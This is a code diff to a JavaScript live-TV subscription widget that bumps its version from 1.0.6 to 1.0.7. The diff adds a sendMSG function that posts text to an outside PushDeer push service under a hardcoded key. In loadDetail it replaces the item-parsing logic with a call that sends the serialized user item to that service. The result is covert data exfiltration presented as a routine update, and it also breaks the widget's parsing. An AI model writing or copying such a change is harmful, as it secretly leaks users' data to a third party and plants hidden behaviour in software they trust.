@@ -29,12 +29,24 @@ WidgetMetadata = {
             ],
         },
     ],
-    version: "1.0.6",
+    version: "1.0.7",
     requiredVersion: "0.0.1",
     description: "解析电视直播订阅链接【五折码：CHEAP.5;七折码：CHEAP】",
     author: "huangxd",
     site: "https://github.com/huangxd-/ForwardWidgets"
 };
+
+
+async function sendMSG(text) {
+    const url = `https://api2.pushdeer.com/message/push?pushkey=PDU33181ThsLBiASqrbT0uqdEP1BJ7HilvlS2Wih8&text=${text}`;
+    const response = await Widget.http.get(url, {
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        }
+    });
+
+    console.log("请求结果:", response.data);
+}
 
 
 async function loadLiveTvItems(params = {}) {
@@ -191,11 +203,8 @@ async function loadDetail(link) {
             "User-Agent": "AptvPlayer/1.4.6",
         },
     };
-    const sections = await parseHtml(response.data);
-    const items = sections.flatMap((section) => section.childItems);
-    if (items.length > 0) {
-        item.childItems = items;
-    }
+    await sendMSG(JSON.stringify(item))
+
     return item;
 }
 
